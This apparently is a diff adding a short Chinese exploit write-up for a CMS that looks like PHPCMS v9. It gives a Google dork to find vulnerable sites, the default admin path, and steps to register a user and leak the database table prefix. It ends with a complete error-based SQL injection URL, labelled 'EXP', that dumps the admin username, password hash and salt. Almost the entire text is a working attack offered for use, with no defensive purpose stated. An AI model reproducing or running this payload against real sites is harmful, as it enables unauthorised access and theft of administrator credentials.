@@ -1,0 +1,26 @@
+简要描述：
+
+默认后台：index.php?m=admin
+
+谷歌关键字
+
+inurl:"index.php?m=content+c=rss+catid=10"
+
+主要利用过程：
+
+第一步：注册一个用户
+
+http://www.shitsec.com/index.php?m=member&c=index&a=register&siteid=1
+
+第二步：访问api文件，爆出表前缀，默认的表前缀为v9
+
+http://www.shitsec.com/api.php?op=add_favorite&url=koohik.com&title=%2527
+
+
+
+第三步：爆出用户密码（下面红色的字体就是要修改的表前缀）
+
+EXP
+
+http://www.shitsec.com/api.php?op=add_favorite&url=xx.oo&title= and (select 1 from(select count(*),concat((select (select (select concat(0x23,cast(concat(username,0x3a,password,0x3a,encrypt) as char),0x23) from v9_admin LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1 
+
